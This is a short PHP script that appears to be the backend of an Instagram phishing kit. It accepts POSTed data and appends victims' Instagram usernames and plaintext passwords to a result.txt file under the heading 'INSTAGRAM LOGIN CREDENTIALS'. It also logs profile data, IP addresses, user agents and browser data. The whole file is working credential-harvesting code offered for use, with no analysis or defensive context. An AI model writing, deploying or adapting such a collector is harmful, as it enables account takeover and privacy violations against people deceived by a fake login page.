<?php

if($_SERVER['REQUEST_METHOD'] == "POST"){
    $data = $_POST['data'];
    
    // Decode JSON data
    $decodedData = json_decode($data, true);
    
    // Add timestamp and IP
    $decodedData['server_timestamp'] = date('Y-m-d H:i:s');
    $decodedData['ip_address'] = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
    $decodedData['user_agent'] = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';
    
    // Format the data for storage
    $formattedData = "=== Instagram Profile Data ===\n";
    $formattedData .= "Timestamp: " . $decodedData['server_timestamp'] . "\n";
    $formattedData .= "IP Address: " . $decodedData['ip_address'] . "\n";
    $formattedData .= "User Agent: " . $decodedData['user_agent'] . "\n";
    
    if(isset($decodedData['type']) && $decodedData['type'] == 'instagram_login') {
        $formattedData .= "=== INSTAGRAM LOGIN CREDENTIALS ===\n";
        $formattedData .= "Username: " . $decodedData['username'] . "\n";
        $formattedData .= "Password: " . $decodedData['password'] . "\n";
        $formattedData .= "Login Status: " . $decodedData['data']['loginStatus'] . "\n";
        $formattedData .= "Profile Data: " . json_encode($decodedData['data'], JSON_PRETTY_PRINT) . "\n";
        $formattedData .= "=====================================\n";
    } elseif(isset($decodedData['type']) && $decodedData['type'] == 'instagram_profile') {
        $formattedData .= "Instagram Username: " . $decodedData['username'] . "\n";
        $formattedData .= "Profile Data: " . json_encode($decodedData['data'], JSON_PRETTY_PRINT) . "\n";
    } else {
        // General user data
        $formattedData .= "Browser Data: " . json_encode($decodedData, JSON_PRETTY_PRINT) . "\n";
    }
    
    $formattedData .= "================================\n\n";
    
    // Append to result file
    file_put_contents("result.txt", $formattedData, FILE_APPEND | LOCK_EX);
    
    // Return success response
    header('Content-Type: application/json');
    echo json_encode(['status' => 'success', 'message' => 'Data saved successfully']);
} else {
    // Return error for non-POST requests
    header('Content-Type: application/json');
    http_response_code(405);
    echo json_encode(['status' => 'error', 'message' => 'Method not allowed']);
}

?>
